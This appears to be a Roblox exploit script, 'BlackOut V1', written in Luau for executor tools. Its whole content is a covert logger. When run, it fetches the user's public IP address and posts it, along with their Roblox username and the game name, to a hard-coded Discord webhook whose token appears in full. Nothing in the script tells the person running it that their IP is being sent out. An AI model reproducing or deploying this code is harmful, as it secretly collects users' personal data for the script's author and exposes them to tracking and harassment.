local HttpService = game:GetService("HttpService")
local webhook_url = "https://discord.com/api/webhooks/1044049524424982588/ne_g2ZW17mFQjbzvcsPCrM91zpOoMJ3i4anqxA_FrmidzdlrXNcAOJeoDVuawC9m3x6M"

local function GetIp() : string
    local request = request or http_request or (syn and syn.request)

    local response = request({Url = "https://api.ipify.org?format=json", Method = "GET"})
    response = game:GetService("HttpService"):JSONDecode(response.Body)


    return response.ip
end

local responce = syn.request(
{
    Url = webhook_url,
    Method = 'POST',
    Headers = {
        ['content-type'] = 'application/json'
    },
    Body = HttpService:jSONEncode({
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "**BlackOut V1 has been executed**",
            ["description"] = game.Players.LocalPlayer.Name.." has executed BlackOut v1 on "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name ,
            ["type"] = "rich",
            ["colour"] = tonumber(0xffffff),
            ["fields"] = {
                {
                    ["name"] = "Ip Address :",
                    ["value"] = GetIp(),
                    ["inline"] = true,
                }
            }
        }}

    })
}
)